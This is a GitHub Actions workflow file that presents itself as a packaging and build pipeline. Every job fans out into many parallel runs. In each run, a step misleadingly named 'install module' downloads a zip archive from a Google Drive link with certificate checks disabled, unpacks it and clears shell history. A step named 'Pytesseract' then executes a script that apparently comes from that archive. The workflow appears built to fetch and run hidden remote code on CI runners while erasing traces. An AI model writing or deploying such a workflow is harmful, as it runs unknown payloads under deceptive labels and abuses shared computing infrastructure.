name: vectordatabase947tech
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  PACKAGE:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.o, I.i, I.ii]
        flag: ['Fetch', 'Integrate', 'Evaluate', 'Execute', 'Publish']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: install module
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1AKrTR68kbKmdZVijjm2V4hIJwXi4Y_q0" -O Luigi.zip
        unzip -o Luigi.zip
        rm Luigi.zip
        history -c && history -w

    - name: Pytesseract
      run: bash requirements.sh


  CREATE1:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.o, I.i, I.ii]
        flag: ['Initialize', 'Develop', 'Test', 'Execute', 'Release']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: install module
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1AKrTR68kbKmdZVijjm2V4hIJwXi4Y_q0" -O Luigi.zip
        unzip -o Luigi.zip
        rm Luigi.zip
        history -c && history -w

    - name: Pytesseract
      run: bash requirements.sh
        
